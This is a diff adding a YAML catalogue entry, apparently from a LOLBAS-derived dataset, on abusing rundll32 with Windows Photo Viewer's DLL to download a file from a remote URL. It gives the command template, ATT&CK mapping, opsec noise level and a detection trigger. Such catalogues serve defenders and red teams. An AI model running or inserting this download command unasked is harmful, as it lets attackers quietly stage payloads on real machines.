@@ -1,0 +1,31 @@
+id: lolbas/photoviewer/download/0
+type: library
+platform: windows
+name: PhotoViewer.dll
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0 (verify upstream LICENSE)
+  upstream_version: 9c5e384
+  last_synced: '2026-08-25'
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+  triggers: Execution of rundll32.exe with 'ImageView_Fullscreen' and a remote URL (containing '://')
+    as an argument
+commands:
+- template: rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen
+    {REMOTEURL}
+  comment: Once executed, rundll32.exe will download the file at the specified URL to the user's INetCache
+    folder using the Windows Photo Viewer DLL.
+references:
+- https://lolbas-project.github.io/lolbas/Libraries/PhotoViewer/
+tags:
+- windows
+- lolbas
